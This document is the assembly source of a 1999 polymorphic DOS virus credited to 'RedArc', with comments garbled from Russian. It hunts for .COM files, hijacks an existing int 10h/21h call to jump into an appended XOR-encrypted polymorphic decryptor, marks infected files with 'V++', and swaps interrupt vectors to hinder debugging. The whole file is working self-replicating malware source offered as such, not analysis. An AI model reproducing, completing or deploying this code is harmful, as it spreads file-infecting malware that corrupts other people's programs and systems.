   ; V++ ¯®«ã¬®àä¨ª ¤«ï âà¥âì¥£® âãà  ª®ªãàá    «ãçè¨©  â¨¢¨àãá
   ; (c) 1999 by RedArc

   IntConst equ 3h

   Model Tiny
   .code
   .386
   org 100h
   start:
   ;* ç «ìë¥ ¡ ©âë ¯à®£à ¬¬ë
          db 100h dup (90h)
   ;‚ â®çª¥, £¤¥  è«¨ IntXX
   Resume equ $-start
   MyLabel:
          jmp @VirusStart
   ;Žª®ç ¨¥ ¯à®£à ¬¬ë
          db 100h dup (90h)
          int 20h
   ;---
   ;!!! ®âáî¤  ¢ ¯à®¨§¢®«ì®¬ ¯®àï¤ª¥ à §¬¥é îâáï ¡«®ª¨ ¤¥ªà¨¯â®à 
   @VirusStart:
          nop
          db 068h     ;‘®åà ¥¨¥ ¢ áâíª¥  ¤à¥á  ¢®§¢à â 
          dw 100h
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          pushf
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          pusha
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          push ds
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          push es
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          push cs
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          push cs
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          pop ds
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          pop es
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;!!! „*Ž**…* !!!
          jmp EntryPoint
   ;!!! „*Ž**…* !!!

          jmp L0 ;¯¥à¥å®¤   á«¥¤ãîé¨© ¡«®ª
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   L0:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          push offset EntryPoint ;*¨å ¥¬ ¢ áâ¥ª  ¤à¥á ¯¥à¥å®¤  ¯®á«¥ ¤¥è¨äà®¢ª¨
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @a
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @a:
          nop
          push offset L1 ;€¤à¥á  ç «  æ¨ª« , á«ãç ©®¥ ª®«¨ç¥áâ¢® à §
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @b
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @b:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          push offset L1 ;€¤à¥á  ç «  æ¨ª« , á«ãç ©®¥ ª®«¨ç¥áâ¢® à §
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @c
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @c:
          nop
          mov bx,1234h ;* ç «ìë© ª«îç ¤¥è¨äà®¢ª¨. ‘«ãç ©®¥ ç¨á«®
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp L1
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   L1:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          mov si,offset EntryPoint
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @d
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @d:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          mov cx, VirLength / 2
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @e
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @e:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          mov di,si
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp L2
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   L2:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          lodsw
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @f
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @f:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          xor ax,bx
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @g
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @g:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          stosw
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @h
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @h:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          dec cx
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          jmp @i
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   @i:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          cmp cx,0
          je @i1
          nop         ;Ž¤®¡ ©â®¢ ï á«ãç © ï ª®¬ ¤ 
          xor bx,1234h
          nop         ;Ž¤®¡ ©â®¢ ï á«ãç © ï ª®¬ ¤ 
          jmp L2
          nop         ;Ž¤®¡ ©â®¢ ï á«ãç © ï ª®¬ ¤ 
   @i1:
          jmp L3
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   L3:
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          xor bx,4321h
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
          ret
          nop         ;‘«ãç ©®¥ ª®«¨ç¥áâ¢® ¡ ©â ¬ãá®à ¯¥à¢®£® à®¤ 
   ;---
   ;!!! Žáî¤   ç¨ ¥âáï § è¨äà®¢  ï ç áâì ª®¤ 
   EntryPoint:
   ;!!! ‘â â¨ç¥áª¨© ¤¥ªà¨¯â®à á® á«ãç ©ë¬ ª«îç¥¬
   ; *â® ã¦® ¤«ï â®£®, çâ®¡ë ª«îç ¢ ¯®«¨¤¥ªà¨¯â®à¥ ¡ë« á«ãç ©ë¬
          call $+3
          cld
          mov si,CryptStart
          pop bp
   KeyStat equ $-EntryPoint
          db 0bbh ;‘«ãç ©ë© ª«îç ¤«ï áâ â¨ç¥áª®£® ¤¥ªà¨¯â®à 
          dw 0
          sub bp,3
          add si,bp
          mov cx,CryptLength / 2
          mov di,si
   @EP_Start:
          lodsw
          not ax
          xor ax,bx
          not ax
          stosw
          loop @EP_Start
   CryptStart equ $-EntryPoint
   ;---
   @CS:
          call IntExchange
   ;***
          mov ax,2501h
          lea dx,[bp+@TestFile]
          int IntConst
   ;***
   GET_DTA:
          mov ah,2fh
          int IntConst     ;*®«ãç¨âì DTA ¯à®£à ¬¬ë
   SAVE_DTA:
          mov ax,es
          mov word ptr ds:[bp+DTA_SEG],ax ;‘®åà ¨âì á¥£¬¥â DTA ¯à®£à ¬¬ë
          mov word ptr ds:[bp+DTA_OFS],bx ;‘®åà ¨âì á¬¥é¥¨¥ DTA ¯à®£à ¬¬ë
          push cs
          pop es      ;‚®ááâ ®¢¨âì § ç¥¨¥ á¥£¬¥â  ES
   SET_DTA_VIR:
          lea dx,[bp+DTA_NEW]
          mov ah,1ah
          int IntConst     ;“áâ ®¢¨âì DTA ¢¨àãá 
   RESTORE_3_BYTES:  ;‚®ááâ ®¢«¥¨¥ á¯àïâ ëå ¡ ©â ¯à®£à ¬¬ë
          lea si,[bp+OLD_BYTES]
          mov di,word ptr ds:[bp+JMP_OFS]
          movsw
          movsb
   FIND_FIRST:
          mov ah,4eh
          lea dx,[bp+FileMask]
          mov cx,0feh ;*®¨áª ¯¥à¢®£® ä ©«  ¯® è ¡«®ã
   Interrupt:
          int IntConst
          jb NotFile
   ;***
          int 1h
   ;       call TestFile
   ;***
          mov ah,4fh
          jmp short Interrupt
   NotFile: ;*ã ¤¥« âì ¥ç¥£®... ¯®à  ®â¤ ¢ âì ¡à®§¤ë ¯à ¢«¥¨ï.
          mov ax,word ptr ds:[bp+DTA_SEG]
          mov ds,ax
          mov dx,word ptr ds:[bp+DTA_OFS]
          mov ah,1ah
          int IntConst
          pop es
          call IntExchange
          pop ds
          popa
          popf
          ret
   ;---
   IntExchange: ;Ž¡¬¥ ¢¥ªâ®à®¢ 21h ¨ 3h
          xor ax,ax
          mov ds,ax
          cli
          xchg word ptr ds:[21h*4],ax
          xchg word ptr ds:[IntConst*4],ax ;*â® áª ¦¨â¥ á¯ á¨¡® CrkV - íâ® ¢á¥ ®... ;)
          xchg word ptr ds:[21h*4],ax
          xchg word ptr ds:[21h*4+2],ax
          xchg word ptr ds:[IntConst*4+2],ax
          xchg word ptr ds:[21h*4+2],ax
          sti
          push cs
          pop ds
          ret
   ;---
   @TestFile equ $-EntryPoint
   TestFile: ;*à®¢¥àª   ©¤¥®£® ä ©«    á®®â¢¥âáâ¢¨¥ ªà¨â¥à¨ï¬ ¢¨àãá 
          pop ax
          pop cx
          pop cx
          push ax
          mov ax,word ptr ds:[bp+DTA_NEW+1ch]
          cmp ax,0
          jne ExitTest ;*®«ìè¥ 65536 ¡ ©â
          mov ax,word ptr ds:[bp+DTA_NEW+1ah]
          cmp ax,1024
          jle ExitTest ;‘«¨èª®¬ ¬ «
          cmp ax,40*1024
          jnb ExitTest ;‘«¨èª®¬ ¢¥«¨ª
          xor cx,cx
          call SetFAttr ;Žç¨é ¥¬  âà¨¡ãâë ä ©« 
          jc ExitTest ;*¥ ¬®¦¥¬ ¨§¬¥¨âì  âà¨¡ãâë
          mov ax,3d02h
          int IntConst ;Žâªàë¢ ¥¬ ä ©«   çâ¥¨¥/§ ¯¨áì
          jc ExitTest ;Žâªàëâì ¥ ¬®¦¥¬
          xchg bx,ax ;‘®åà ï¥¬ Handle
          mov ah,3fh
          lea dx,[bp+Reserv]
          mov cx,3
          int IntConst ;—¨â ¥¬ ¯¥à¢ëå âà¨ ¡ ©â  ä ©«  - íâ® ª«îç ¤«ï à áè¨äà®¢ª¨ ¬¥âª¨
          jc CloseFile ;*à®ç¨â âì ¥ ¬®¦¥¬
          lea si,[bp+Reserv]
          lodsw
          cmp ax,'MZ'
          je CloseFile ;*â® EXE-¯à®£à ¬¬  á COM-à áè¨à¥¨¥¬
          cmp ax,'ZM'
          je CloseFile
          mov dx,word ptr ds:[bp+DTA_NEW+1ah]
          sub dx,3
          call GoToBegin ;“å®¤¨¬ §  âà¨ ¡ ©â  ®â ª®æ  ä ©« 
          jc CloseFile ;*ã ã¦ ï ¥ § î, ¯®ç¥¬ã ¥ á¬®£«¨
          mov ah,3fh
          lea dx,[bp+OLD_BYTES]
          mov cx,3
          int IntConst ;—¨â ¥¬ ¯®á«¥¤¨¨ âà¨ ¡ ©â  ä ©«  - íâ® ¬®¦¥â ¡ëâì  è¥© ¬¥âª®©
          jc CloseFile ;*â®  ¢¥à®¥ çâ®¡ë CrkV ª  ¬ ¥ ¯à¨áâ ¢ « ;)
          mov ax,word ptr ds:[bp+OLD_BYTES]
          mov cx,word ptr ds:[bp+Reserv]
          xor ah,ch
          xor al,cl
          cmp ax,'+V'
          je CloseFile ;“¦¥ ¨ä¥æ¨à®¢ 
          call InfectFile ;‚®â ª ª à § â®, çâ® ¬ë ¨áª «¨
   CloseFile:
          mov ax,5701h
          mov cx,word ptr ds:[bp+DTA_NEW+16h]
          mov dx,word ptr ds:[bp+DTA_NEW+18h]
          int IntConst ;‚®ááâ ®¢¨¬ ¤ âã/¢à¥¬ï ä ©« 
          jc ExitTest ;*¥ á¬®£«¨ :(
          mov ah,3eh
          int IntConst ;‡ ªà®¥¬ ä ©«
          jc ExitTest ;Ž¯ïâì ¥ á¬®£«¨ :(
          xor cx,cx
          mov cl,byte ptr ds:[bp+DTA_NEW+15h]
          call SetFAttr ;‚®ááâ ®¢¨¬  âà¨¡ãâë ä ©« 
   ExitTest:
          ret ;ˆé¥¬ á«¥¤ãîé¨©
   ;---
   InfectFile: ;ˆä¥æ¨à®¢ ¨¥  ©¤¥®£® ä ©« 
          mov dx,0
          call GoToBegin ;“å®¤¨¬ ¢  ç «® ä ©« 
          lea dx,[bp+Buffer]
          mov cx,1024
          mov ah,3fh
          int IntConst ;—¨â ¥¬ ¯¥à¢ë© ª¨«®¡ ©â ä ©«  ¢ ¡ãä¥à
          call FindSpace ;ˆé¥¬ ¬¥áâ® ¤«ï ¢¥¤à¥¨ï
          cmp di,0ffffh
          jne InfectToSpace  ;* è«¨ â¥¯«¥ìª®¥ ¬¥áâ¥çª®
          lea di,[bp+Buffer] ;*ã¬ ¯¨á âì ¯¥à¥å®¤ ¢  ç «® ä ©« 
   InfectToSpace:
          push di
          lea si,[bp+OLD_BYTES]
          xchg si,di
          movsw
          movsb ;‘®åà ï¥¬ ¡ ©âë ¯à®£à ¬¬ë, ª®â®àë¥ § ¬¥¨¬ á¢®¨¬¨
          pop di
          sub di,Buffer
          sub di,bp
          call InfectedInToSpace ;ˆä¥æ¨à®¢ ¨¥
          ret
   ;---
   FindSpace: ;*®¨áª Int 10h / Int 21h ¢ ¯¥à¢®¬ ª¨«®¡ ©â¥ ä ©« 
          push ax bx cx dx
          lea si,[bp+MInt10h]
          lea di,[bp+Buffer]
          mov cx,1024
          mov bx,2
          call concatenat_string_in_memory ;ˆé¥¬ Int 10h
          cmp di,0ffffh
          jne OkFindSpace ;* è«¨, ®¤ ª® ;)
          lea si,[bp+MInt21h]
          lea di,[bp+Buffer]
          mov cx,1024
          mov bx,2
          call concatenat_string_in_memory ;ˆé¥¬ Int 21h
   OkFindSpace:
          pop dx cx bx ax
          ret
   ;---
   InfectedInToSpace:
          mov dx,di
          call GoToBegin ;“å®¤¨¬    ©¤¥®¥ ¬¥áâ® ¢ ä ©«¥
          mov ax,word ptr ds:[bp+DTA_NEW+1ah]
          sub ax,di
          sub ax,3 ;Š «ìªã«¨àã¥¬  ¤à¥á ¯¥à¥å®¤     ç «® ¯®«¨¤¥ªà¨¯â®à 
          lea si,[bp+Reserv]
          mov byte ptr ds:[si],0e9h
          mov word ptr ds:[si+1],ax ;Š «ìªã«¨àã¥¬ ª®¬ ¤ã ¯¥à¥å®¤ 
          mov ax,di
          add ax,100h
          mov word ptr ds:[bp+JMP_OFS],ax ;‘®åà ï¥¬ á¬¥é¥¨¥ ¢ ¯ ¬ïâ¨ ª®¬ ¤ë
          xchg dx,si
          mov ah,40h
          mov cx,3
          int IntConst ;‡ ¯¨áë¢ ¥¬ ª®¬ ¤ã ¯¥à¥å®¤    ¯®«¨¤¥ªà¨¯â®à
   CalcNewVirus: ;*ã¤¥¬ ¤¥« âì ®¢ãî âãèªã ¢¨àãá 
          call ZerroBuffer ;Žç¨é ¥¬ ¡ãä¥à ¤«ï åà ¥¨ï á¬¥é¥¨© ¡«®ª®¢
   ;---
          lea di,[bp+Buffer]
          call Musor
          call CalcPoly
   ;---
          call GoToEnd ;“å®¤¨¬ ¢ ª®¥æ ä ©« 
          lea dx,[bp+Buffer]
          mov cx,di
          sub cx,dx
          mov ah,40h
          int IntConst ;‡ ¯¨áë¢ ¥¬ ¯®«¨¤¥ªà¨¯â®à
   ;---
          push si di
          mov ax,word ptr ds:[bp+DTA_NEW+1ah]
          inc ah
          mov si,word ptr ds:[bp-IndexBuff]
          lea di,[bp+Buffer]
          sub si,di
          add ax,si ;‚ à¥£¨áâà¥ AX á¬¥é¥¨¥ â®çª¨ ¢å®¤  ¢ ¯®«¨¤¥ªà¨¯â®à
          mov dx,word ptr ds:[bp+JMP_OFS] ;‘¬¥é¥¨¥ ª®¬ ¤ë JMP Virus
          sub ax,dx
          sub ax,3 ;*®¢ë©  ¤à¥á ¯¥à¥å®¤    â®çªã ¢å®¤  ¢ ¯®«¨¤¥ªà¨¯â®à
          mov word ptr ds:[bp+VirLength],ax
          dec dh
          inc dl   ;€¤à¥á ¯¥à¥å®¤  ¢ ä ©«¥
          call GoToBegin
          lea dx,[bp+VirLength]
          mov cx,2
          mov ah,40h
          int IntConst ;‡ ¯¨áë¢ ¥¬  ¤à¥á â®çª¨ ¢å®¤  ¢ ¯®«¨¤¥ªà¨¯â®à
          pop di si
   ;---
          call GoToEnd ;“å®¤¨¬ ¢ ª®¥æ ä ©« 
   ;Š «ìªã«¨àã¥¬ ®¢ë© ª«îç ¤«ï áâ â¨ç¥áª®£® ¤¥ªà¨¯â®à 
          push bx
          call _Calc_Rnd16
          mov word ptr ds:[bp+TabelleKeys+6],bx
          mov word ptr ds:[bp+KeyStat+1],bx
   ;‡ ¯¨áë¢ ¥¬ ¢ ¡ãä¥à âãèªã
          cld
          mov si,bp
          lea di,[bp+Buffer]
          mov cx,VirLength
          rep movsb
   ;˜¨äàã¥¬ âãèªã áâ â¨ç¥áª¨¬ ¤¥ªà¨¯â®à®¬
          lea di,[bp+Buffer+CryptStart]
          mov si,di
          mov cx,CryptLength / 2
   @EP_Start1:
          lodsw
          not ax
          xor ax,bx
          not ax
          stosw
          loop @EP_Start1
   ;˜¨äàã¥¬ ¡ãä¥à ª«îç ¬¨ ®â ¯®«¨¤¥ªà¨¯â®à 
   ;- ‚ëç¨á«ï¥¬ ª«îç
   PPoly0:
          mov ax,2
          push ax
          mov bx,word ptr ds:[bp+TabelleKeys]
   PPoly1:
          mov cx,VirLength / 2
   PPoly2:
          mov ax,word ptr ds:[bp+TabelleKeys+2]
          xor bx,ax
          loop PPoly2
          pop ax
          cmp ax,0
          je PPoly3
          dec ax
          push ax
          mov ax,word ptr ds:[bp+TabelleKeys+4]
          xor bx,ax
          jmp PPoly1
   ;- Š®¤¨àã¥¬
   PPoly3:
          mov ax,2
          push ax
   PPolyL0:
          lea si,[bp+Buffer]
          mov di,si
          mov cx,VirLength / 2
   PPolyL1:
          lodsw
          xor ax,bx
          stosw
          mov ax,word ptr ds:[bp+TabelleKeys+2]
          xor bx,ax
          loop PPolyL1
          pop ax
          cmp ax,0
          je PPolyL_1
          dec ax
          push ax
          mov ax,word ptr ds:[bp+TabelleKeys+4]
          xor bx,ax
          jmp PPolyL0
   PPolyL_1:
   ;‡ ¯¨áë¢ ¥¬ ¡ãä¥à ¢ ä ©«
          pop bx
          call GoToEnd ;“å®¤¨¬ ¢ ª®¥æ ä ©« 
          mov cx,VirLength
          lea dx,[bp+Buffer]
          mov ah,40h
          int IntConst
   ;‘ç¨âë¢ ¥¬ ¯¥à¢ë¥ âà¨ ¡ ©â  ä ©« 
          sub dx,dx
          call GoToBegin
          mov ah,3fh
          lea dx,[bp+Reserv]
          mov cx,3
          int IntConst ;—¨â ¥¬ ¯¥à¢ëå âà¨ ¡ ©â  ä ©«  - íâ® ª«îç ¤«ï è¨äà®¢ª¨ ¬¥âª¨
   ;Š®¤¨àã¥¬ ¬¥âªã
          lea si,[bp+Reserv]
          mov di,si
          lodsb
          xor al,'V'
          stosb
          lodsb
          xor al,'+'
          stosb
          lodsb
          xor al,'+'
          stosb
   ;‡ ¯¨áë¢ ¥¬ ¬¥âªã ¢ ª®¥æ ä ©« 
          call GoToEnd ;“å®¤¨¬ ¢ ª®¥æ ä ©« 
          call WriteEnd
          mov ah,40h
          lea dx,[bp+Reserv]
          mov cx,3
          int IntConst ;‡ ¯¨áë¢ ¥¬ ¬¥âªã ¢¨àãá 
   ;‚ëå®¤
          ret
   ;---
   WriteEnd:
          mov ah,0ffh
          call RND_Tabelle
          xor ax,ax
          xchg cl,ah
          mov ah,40h
          lea dx,[bp-256]
          int IntConst
          ret
   ;---
   include musor.inc
   include find.inc
   include service.inc
   include poly.inc
   include permut.inc
   ;---
   ;€ íâ® ï à¥è¨« ¥¬®£® ¯à¨ª®«®âìáï. *¥â, ã ¯à ¢¤ . „®«¦® ¡ëâì ¢¥á¥«® ;)
   db ' Jedem das Seinem '
   ;---
   ;!!! „ ë¥ ¢¨àãá 
   MInt10h equ   $-EntryPoint
          int 10h
   MInt21h equ   $-EntryPoint
          int 21h
   FileMask equ  $-EntryPoint
          db '*.com',0h
   DTA_SEG equ   $-EntryPoint
          dw ?
   DTA_OFS equ   $-EntryPoint
          dw ?
   JMP_OFS equ   $-EntryPoint
          dw Resume + 100h
   OLD_BYTES equ $-EntryPoint
           int 20h
           db 90h
   ;---
   CryptLength equ $-@CS
   VirLength equ $-EntryPoint
   ;!!! Š®¥æ â¥«  ¢¨àãá  ¨ ¨¤¥â¨ä¨ª â®à § à ¦¥®áâ¨ ä ©« 
   db 12 dup (?)
   Ident: db 'V' xor 90h, '+' xor 90h, '+' xor 90h
   ;---
   ;!!! „¨ ¬¨ç¥áª¨¥ ¤ ë¥ ¢¨àãá 
   ;---
   Reserv equ    $-EntryPoint
          db 3 dup (?)
   ;---
   DTA_NEW equ   $-EntryPoint
          db 80h dup (?)
   ;---
   Buffer equ    $-EntryPoint
   end start
